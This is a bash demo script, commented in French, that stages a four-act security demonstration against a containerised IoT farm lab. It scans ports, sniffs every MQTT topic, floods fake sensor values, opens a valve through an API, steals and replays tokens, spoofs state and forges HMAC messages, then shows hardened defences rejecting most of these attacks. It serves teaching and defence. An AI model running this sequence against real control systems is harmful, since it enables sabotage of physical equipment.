#!/usr/bin/env bash
# Déroulé scripté de la démo, avec pause (Entrée) entre chaque étape.
# Usage : bash scripts/demo.sh [acte1|acte2|acte3|acte4|all]
set -euo pipefail
cd "$(dirname "$0")/.."

ensure_attacker() { docker compose --progress quiet --profile attack up -d attacker >/dev/null; }
run()  { docker compose exec -T attacker python3 attack.py "$@"; }
atk()  { docker compose exec -T attacker "$@"; }
step() { printf '\n\033[1;32m$ %s\033[0m\n' "$*"; [[ ${NO_PAUSE:-} ]] || read -r -p "  (Entrée)" _; }

acte1() {
  echo "=== ACTE 1 — La ferme est ouverte (insecure)"
  bash scripts/mode.sh insecure
  step "nmap -sV -p 1883,8883,8080 mosquitto dashboard"
  atk nmap -sV -p 1883,8883,8080 mosquitto dashboard | grep -E "^[0-9]+/tcp"
  step "mosquitto_sub -h mosquitto -t '#' -v -W 6"
  atk mosquitto_sub -h mosquitto -t '#' -v -W 6 || true
}

acte2() {
  echo "=== ACTE 2 — Mentir et agir (insecure)"
  step "attack.py flood --value 0"; run flood --value 0
  step "curl -X POST /api/valve/open"; run valve
  sleep 4
  step "attack.py state"; run state
}

acte3() {
  echo "=== ACTE 3 — Défense naïve, puis contournement (secure)"
  bash scripts/mode.sh secure
  step "attack.py flood --value 0   (rejeté)"; run flood --value 0
  step "curl -X POST /api/valve/open   (403)"; run valve
  step "attack.py replay   (vol du token sur le bus, puis rejeu)"
  run replay --simulate-operator --close-first
  step "attack.py spoof-state --state CLOSED   (l'opérateur est aveugle)"; run spoof-state --state CLOSED
  step "attack.py flood --value 25   (plausible, passe le filtre)"; run flood --value 25 --count 30
  sleep 3
  step "attack.py state"; run state
}

acte4() {
  echo "=== ACTE 4 — Défense en profondeur (hardened)"
  bash scripts/mode.sh hardened
  step "attack.py anon   (1883 fermé, 8883 refuse l'anonyme)"; run anon
  step "attack.py sniff --as viewer   (ACL : seuls les capteurs sont visibles)"; run sniff --as viewer --seconds 4 --limit 6
  step "attack.py flood --as viewer   (écriture refusée)"; run flood --as viewer --count 2
  step "attack.py spoof-state --as sensor-02   (refusé)"; run spoof-state --as sensor-02
  step "attack.py replay --as maintenance   (HMAC + nonce)"; run replay --as maintenance --simulate-operator --close-first
  step "attack.py forge --as maintenance   (sans clé HMAC)"; run forge --as maintenance
  sleep 1; step "attack.py state   (journal : rejeu et forge rejetés)"; run state
  step "attack.py flood --as sensor-02 --value 25   (saut détecté)"; run flood --as sensor-02 --value 25 --count 10
  step "attack.py drift --as sensor-02   (dérive lente : la limite)"; run drift --as sensor-02
  sleep 3
  step "attack.py state"; run state
}

ensure_attacker   # conteneur attaquant persistant, réutilisé par tous les actes
case ${1:-all} in
  acte1) acte1 ;; acte2) acte2 ;; acte3) acte3 ;; acte4) acte4 ;;
  all) acte1; acte2; acte3; acte4 ;;
  *) echo "usage: demo.sh [acte1|acte2|acte3|acte4|all]" >&2; exit 1 ;;
esac
